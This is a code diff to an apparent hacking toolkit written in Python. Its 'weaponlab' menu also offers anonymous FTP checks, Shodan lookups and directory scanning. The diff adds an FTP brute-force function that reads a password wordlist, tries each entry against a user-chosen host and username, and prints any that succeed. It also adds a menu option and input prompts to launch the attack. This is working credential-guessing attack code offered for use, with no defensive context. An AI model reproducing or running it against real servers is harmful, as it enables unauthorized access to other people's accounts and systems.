@@ -130,7 +130,7 @@ def anonftplogin(hostname):
         try:
             ftp = ftplib.FTP(hostname)
             consolemessage('Attempting to connect to ' + str(hostname) + '...')
-            ftp.login('anonymous', 'me@your.com')
+            ftp.login()
             consolemessage('FTP Anonymous Login Succeeded')
             ftp.quit()
             input("Press ENTER To Go Back.")
@@ -139,6 +139,23 @@ def anonftplogin(hostname):
             consolemessage('FTP Anonymous Login Failed')
             input("Press ENTER To Go Back.")
             return False
+
+def ftpbrute(hostname, username, wordlist):
+    ftp = ftplib.FTP(hostname)
+    consolemessage('Starting bruteforce for ' + hostname + ':' + username + ':' + wordlist)
+    with open(wordlist, "r") as list:
+        for line in list:
+            try:
+                passw = line.strip()
+                ftp.login(username, passw)
+                print('[\u001b[32m+\u001b[0m] ' + hostname + ' : ' + username + ' : ' + passw)
+            except:
+                pass
+        list.close()
+    consolemessage('Bruteforcing Done!')
+    input('Press ENTER To Go Back.')
+
+
 
 def shodanlookup():
         try:
@@ -187,7 +204,7 @@ def flushletters(word):
                 time.sleep(0.1)
 
 def consolemessage(message):
-        print("[\u001b[38;5;208mCB\u001b[0m]\u001b[38;5;200m─►\u001b[0m " + str(message))
+        print("[\u001b[38;5;208mSS\u001b[0m]\u001b[38;5;200m─►\u001b[0m " + str(message))
 
 
 
@@ -346,6 +363,7 @@ try:
 \u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m01\u001b[0m] Anonymous FTP Connection
 \u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m02\u001b[0m] Shodan Lookup
 \u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m03\u001b[0m] Site Directory Scanner
+\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m04\u001b[0m] FTP Brute Forcer
 \u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m99\u001b[0m] Back
 \u001b[38;5;50m|\u001b[0m[ \u001b[38;5;226mCNTRL + C TO EXIT\u001b[0m ]\u001b[38;5;50m
 |
@@ -397,6 +415,16 @@ try:
                             flushletters("Version 1.0.0")
                             print("\u001b[0m")
                             
+                        if weaponlabchoice == "4":
+                            host = input("\n\u001b[38;5;50mFTP BRUTE FORCER\u001b[0m\n\nWhat is the IP of the machine hosting FTP : ")
+                            wordlist = input("What wordlist would you like to use : ")
+                            user = input("What username would you like to use : ")
+                            ftpbrute(host, user, wordlist)
+                            clear()
+                            print(banner, end="", flush=True)
+                            time.sleep(3)
+                            flushletters("Version 1.0.0")
+                            print("\u001b[0m")
 
                         if weaponlabchoice == "99":
                                 pass
